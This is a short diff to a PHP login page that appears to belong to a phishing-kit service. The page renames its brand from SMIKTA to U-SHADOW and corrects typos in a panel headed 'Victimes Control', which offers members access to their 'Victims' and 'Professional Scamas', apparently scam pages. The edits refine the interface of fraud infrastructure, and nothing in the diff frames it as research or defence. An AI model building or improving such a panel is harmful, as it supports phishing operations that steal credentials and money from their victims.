@@ -52,7 +52,7 @@ $csrf_token = generate_csrf_token();
 <div class="container-old">
     <header class="header-old-index">
         <div class="smikta-logo-corner">
-            <div class="logo-diamond">SMIKTA</div>
+            <div class="logo-diamond">U-SHADOW</div>
         </div>
         <div class="telegram-banner">
              <a href="https://t.me/your_telegram" target="_blank" class="btn-telegram">
@@ -90,7 +90,7 @@ $csrf_token = generate_csrf_token();
                     <div class="form-group-old">
                         <input type="password" name="password" placeholder="Password" required>
                     </div>
-                    <button type="submit" class="btn-old-submit">Sign In</button>
+                    <button type="submit" class="btn-old-submit">Sign In Now</button>
                     <div style="margin-top: 10px; font-size: 11px;">
                         <a href="#" style="color: #666; text-decoration: none;">Forgot Password?</a>
                     </div>
@@ -105,9 +105,9 @@ $csrf_token = generate_csrf_token();
         <section class="panel-old victims-panel-old">
             <div class="panel-header-old">.: Victimes Control :.</div>
             <div class="panel-body-old" style="text-align: center; color: #999; min-height: 200px; display: flex; flex-direction: column; justify-content: center;">
-                <p>Soory You Must Be Member To See Your Vistimes</p>
-                <p>Sing Up for Get Your Profisionel Scamas</p>
-                <p><a href="signup.php" style="color: var(--primary);">Sing Up Here</a></p>
+                <p>Hello You Must Be Member To See Your Victims</p>
+                <p>Sign Up to Get Your Professional Scamas</p>
+                <p><a href="signup.php" style="color: var(--primary);">Sign Up Here</a></p>
             </div>
         </section>
     </main>
